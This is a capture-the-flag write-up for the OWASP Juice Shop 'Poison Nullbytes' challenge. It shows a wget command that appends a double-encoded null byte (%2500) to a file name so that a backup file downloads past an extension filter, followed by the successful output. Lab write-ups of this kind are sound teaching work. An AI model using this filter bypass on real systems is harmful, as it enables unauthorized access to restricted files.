## Poison Nullbytes
**Category:** Improper Input Validation

**Difficulty:** 4/5

**Challenge Description:** Bypass a security control with a Poison Null Byte to access a file not meant for your eyes.

## Approach

### Download Restrictions with File Extensions

As already seen in [Starting Point](/startingpoint.md) we can only download files from the ftp endpoint, if they end with *.md* or *.pdf*. This literally screams for null byte poisoning.

### Adding a Null Byte to the URL

When using `wget`, you can simply add the null byte (URL encode %00 => %2500) in the URL.

```Shell
┌──(orb1t4l㉿elysium)-[~/OWASP/juice-shop/ftp-files]
└─$ wget http://192.168.0.1:3000/ftp/package.json.bak%2500.md
--2024-09-13 11:58:56--  http://192.168.0.1:3000/ftp/package.json.bak%2500.md
Connecting to 192.168.0.1:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4291 (4.2K) [application/octet-stream]
Saving to: ‘package.json.bak%00.md’

package.json.bak%00.md                               100%[=====================================================================================================================>]   4.19K  --.-KB/s    in 0s      

2024-09-13 11:58:56 (397 MB/s) - ‘package.json.bak%00.md’ saved [4291/4291]
```

The download restriction was successfully bypassed, and if we download the remaining files, we also solve some more challenges:

- **Easter Egg**
- **Forgotten Developer Backup**
- **Forgotten Sales Backup**
- **Misplaced Signature File**